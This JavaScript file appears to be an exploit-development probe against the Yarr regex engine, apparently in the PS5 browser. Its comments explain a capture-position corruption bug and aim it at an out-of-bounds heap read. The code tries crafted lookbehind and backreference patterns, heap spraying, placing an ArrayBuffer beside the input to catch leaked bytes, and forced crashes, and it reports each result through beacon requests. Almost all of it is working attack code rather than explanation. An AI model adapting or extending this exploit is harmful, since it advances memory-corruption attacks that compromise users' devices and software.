// p233-yarr-c3-escalate.js — Yarr C3 position corruption escalation
// Bug: position corruption in tryConsumeBackReference with backward surrogate pair matching
// Source: YarrInterpreter.cpp:609-655, reread() at :351-358
// reread(unsigned from) has only ASSERT(from < length) — compiled out on PS5 release
// Goal: make the corrupted matchBegin value escape the string bounds → OOB read via reread()
//
// The capture output (matchBegin/matchEnd) from recordParenthesesMatch (line 1061) stores:
//   output[id*2 + matchDir] = matchBegin - inputPosition
// For backward (lookbehind), matchDir=1. These flow to tryConsumeBackReference at line 964.
// If the lookbehind produces a corrupted matchBegin that exceeds string length,
// reread(matchBegin + i) reads OOB from the heap.

(function() {
  var B = "V233-";
  function beacon(tag) {
    try { new Image().src = "/BEACON?" + B + tag + "&t=" + Date.now(); } catch(e) {}
  }

  function hexCP(s) {
    var r = [];
    for (var i = 0; i < s.length && i < 20; i++)
      r.push(s.charCodeAt(i).toString(16).padStart(4, "0"));
    return r.join("-");
  }

  beacon("START");

  // === TEST A: Observe capture groups from the C3 pattern via replace ===
  // The corruption happens INSIDE the lookbehind. Use a replace function
  // to observe what the engine captured.
  try {
    var input1 = "\u{10000}ab";
    // This pattern has a lookbehind with a backreference and a capture group
    var re1 = /(?<=(\u{10000})\1*(a))b/u;
    var captures = [];
    var replaced = input1.replace(re1, function() {
      // arguments: match, p1, p2, ..., offset, string, groups
      for (var i = 0; i < arguments.length; i++)
        captures.push(i + ":" + (arguments[i] === undefined ? "undef" :
                      typeof arguments[i] === "string" ? hexCP(arguments[i]) :
                      arguments[i]));
      return "X";
    });
    if (captures.length > 0) {
      beacon("A-CAPS-" + captures.length + "-" + captures.join(",").slice(0, 200));
    } else {
      beacon("A-NOCAPS");
    }
  } catch(e) {
    beacon("A-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST B: Force multiple backreference iterations to compound displacement ===
  // \1* with greedy quantifier means tryConsumeBackReference loops at line 995
  // Each iteration reads via reread(matchBegin + i) with possibly corrupted matchBegin
  try {
    var sur32 = "\u{10000}".repeat(32);
    var input2 = sur32 + "ab";
    var re2 = /(?<=\u{10000}\1*(a))b/u;
    var result2 = re2.exec(input2);
    beacon("B-SUR32-" + (result2 === null ? "NULL" : hexCP("" + result2)));
  } catch(e) {
    beacon("B-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST C: Nested lookbehind to amplify position corruption ===
  try {
    var input3 = "\u{10000}ab";
    var re3 = /(?<=(?<=\u{10000})(a)\1*)b/u;
    var result3 = re3.exec(input3);
    beacon("C-NESTED-" + (result3 === null ? "NULL" : hexCP("" + result3)));
  } catch(e) {
    beacon("C-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST D: Try to make matchBegin underflow (go negative → huge unsigned) ===
  // If matchBegin - inputPosition underflows unsigned at line 1061
  // Build a pattern where inputPosition > matchBegin
  try {
    // Short input, lookbehind with large inputPosition offset
    var input4 = "\u{10000}ab";
    var re4 = /(?<=\u{10000}\1{0,100}(a))b/u;
    var result4 = re4.exec(input4);
    beacon("D-UNDERFLOW-" + (result4 === null ? "NULL" : hexCP("" + result4)));
  } catch(e) {
    beacon("D-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST E: Spray controlled strings, use corrupted captures to observe ===
  // Allocate many strings before and after the input string
  // If the corrupted position reads OOB, it'll read these
  try {
    var marker = "LEAK";
    var spray = [];
    for (var i = 0; i < 1000; i++)
      spray.push(marker.repeat(64)); // 256 bytes each, all "LEAKLEAKLEAK..."

    var input5 = "\u{10000}ab";
    var re5 = /(?<=\u{10000}\1*(a))(.)/u;
    var result5 = re5.exec(input5);
    if (result5) {
      for (var j = 1; j < result5.length; j++) {
        var cap = result5[j];
        if (cap !== undefined && cap.length > 0) {
          var cp = cap.charCodeAt(0);
          // Check if we read something from the spray (L=0x4C, E=0x45, A=0x41, K=0x4B)
          if (cp === 0x4C || cp === 0x45 || cp === 0x41 || cp === 0x4B) {
            beacon("E-LEAK-cp" + cp.toString(16) + "-cap" + j + "-" + hexCP(cap));
          } else {
            beacon("E-CAP" + j + "-cp" + cp.toString(16) + "-" + hexCP(cap));
          }
        }
      }
    } else {
      beacon("E-NULL");
    }
    spray = null;
  } catch(e) {
    beacon("E-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST F: Use String.prototype.split to extract corrupted indices ===
  // split uses the regex match positions to split the string
  // If positions are corrupted, split might produce unexpected substrings
  try {
    var input6 = "\u{10000}ab" + "X".repeat(100);
    var re6 = /(?<=\u{10000}\1*(a))b/u;
    var parts = input6.split(re6);
    if (parts.length > 1) {
      beacon("F-SPLIT-" + parts.length);
      for (var k = 0; k < parts.length && k < 5; k++) {
        beacon("F-P" + k + "-len" + parts[k].length + "-" + hexCP(parts[k].slice(0, 10)));
      }
    } else {
      beacon("F-NOSPLIT-" + parts.length);
    }
  } catch(e) {
    beacon("F-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST G: Multiple surrogate pairs with varying backreference greediness ===
  // Force many iterations of tryConsumeBackReference to see if position diverges
  try {
    var input7 = "\u{10000}" + "a".repeat(50) + "b";
    var re7 = /(?<=\u{10000}\1*(a{1,50}))b/u;
    var result7 = re7.exec(input7);
    if (result7) {
      beacon("G-MATCH-" + result7.length + "-" + hexCP("" + result7));
      if (result7[1]) beacon("G-CAP1-len" + result7[1].length + "-" + hexCP(result7[1].slice(0,10)));
    } else {
      beacon("G-NULL");
    }
  } catch(e) {
    beacon("G-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST H: Different supplementary characters in the lookbehind ===
  // Try various surrogate pair code points to see if displacement varies
  try {
    var surrogates = [
      "\u{10000}", "\u{10001}", "\u{1F600}", "\u{20000}", "\u{2F800}",
      "\u{E0001}", "\u{10FFFD}"
    ];
    for (var si = 0; si < surrogates.length; si++) {
      var s = surrogates[si];
      var inp = s + "ab";
      var re = new RegExp("(?<=" + s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') +
                          "\\1*(a))b", "u");
      try {
        var r = re.exec(inp);
        beacon("H" + si + "-" + (r === null ? "NULL" : "MATCH") +
               "-cp" + s.codePointAt(0).toString(16));
      } catch(ee) {
        beacon("H" + si + "-ERR");
      }
    }
  } catch(e) {
    beacon("H-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST I: Attempt OOB read via crafted input size + position ===
  // Allocate target ArrayBuffer, then input string, hoping they're adjacent
  // If corrupted position reads past end of string, it reads the ArrayBuffer
  try {
    var targetAB = new ArrayBuffer(1024);
    var targetView = new Uint8Array(targetAB);
    for (var ti = 0; ti < 1024; ti++) targetView[ti] = 0xBE; // fill with 0xBE marker

    // Create input string that's a specific size
    var prefix = "\u{10000}";
    var padding = "a".repeat(126); // tune to align with AB
    var input9 = prefix + padding + "b";
    var re9 = /(?<=\u{10000}\1*(a))b/u;
    var result9 = re9.exec(input9);
    if (result9) {
      beacon("I-MATCH-" + hexCP("" + result9));
      if (result9[1]) {
        var capLen = result9[1].length;
        beacon("I-CAP1LEN-" + capLen);
        // Check every character of the capture for 0xBE marker
        for (var ci = 0; ci < capLen && ci < 50; ci++) {
          var cc = result9[1].charCodeAt(ci);
          if (cc === 0xBE || cc === 0xBEBE) {
            beacon("I-OOB-MARKER-at" + ci + "-" + cc.toString(16));
          }
        }
      }
    } else {
      beacon("I-NULL");
    }
    targetAB = null;
  } catch(e) {
    beacon("I-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST J: matchAll to observe all match attempts and their positions ===
  try {
    var input10 = "\u{10000}ab".repeat(5);
    var re10 = /(?<=\u{10000}\1*(a))b/gu;
    var allMatches = [];
    var m;
    while ((m = re10.exec(input10)) !== null && allMatches.length < 20) {
      allMatches.push("i" + m.index + ":c" + (m[1] ? hexCP(m[1]) : "undef"));
    }
    beacon("J-ALL-" + allMatches.length + "-" + allMatches.join(",").slice(0, 150));
  } catch(e) {
    beacon("J-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST K: Force the backref to attempt reading beyond string via large matchSize ===
  // If matchEnd > matchBegin are corrupted, matchSize = matchEnd - matchBegin
  // can be huge, making the loop iterate far past the string
  try {
    var input11 = "\u{10000}" + "a".repeat(200) + "b" + "\u{10000}".repeat(50);
    var re11 = /(?<=\u{10000}(\1*)(a{1,200}))b/u;
    var result11 = re11.exec(input11);
    if (result11) {
      beacon("K-MATCH-caps" + result11.length);
      for (var ki = 1; ki < result11.length && ki < 4; ki++) {
        var kc = result11[ki];
        beacon("K-C" + ki + "-" + (kc === undefined ? "undef" : "len" + kc.length));
      }
    } else {
      beacon("K-NULL");
    }
  } catch(e) {
    beacon("K-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST L: Deliberately trigger crash with massive surrogate input ===
  // If position corruption scales with surrogate count, enough surrogates
  // might push the position into unmapped memory → SIGSEGV = confirmation of OOB
  try {
    var bigInput = "\u{10000}".repeat(4096) + "ab";
    var re12 = /(?<=\u{10000}\1*(a))b/u;
    var result12 = re12.exec(bigInput);
    beacon("L-BIG4K-" + (result12 === null ? "NULL" : "MATCH"));
  } catch(e) {
    beacon("L-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  try {
    var hugeInput = "\u{10000}".repeat(32768) + "ab";
    var re13 = /(?<=\u{10000}\1*(a))b/u;
    var result13 = re13.exec(hugeInput);
    beacon("L-BIG32K-" + (result13 === null ? "NULL" : "MATCH"));
  } catch(e) {
    beacon("L-ERR2-" + encodeURIComponent(e.message).slice(0,60));
  }

  beacon("DONE");
})();
